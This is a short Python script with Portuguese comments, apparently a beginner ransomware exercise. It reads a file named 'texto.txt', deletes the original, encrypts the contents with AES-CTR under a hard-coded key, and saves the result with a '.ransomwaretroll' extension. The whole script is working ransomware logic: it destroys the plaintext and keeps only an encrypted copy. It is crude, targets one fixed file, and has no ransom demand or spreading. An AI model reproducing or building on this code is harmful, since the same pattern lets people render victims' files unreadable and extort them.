import os
import pyaes

## Faz a abertura do arquivo a ser criptografado

file_name = "texto.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## Removendo o arquivo original

os.remove(file_name)

## Definindo a chave de encriptação

key = b"textoransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## Criptografar o arquivo

crypto_data = aes.encrypt(file_data)

## Salvar o arquivo criptografado

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
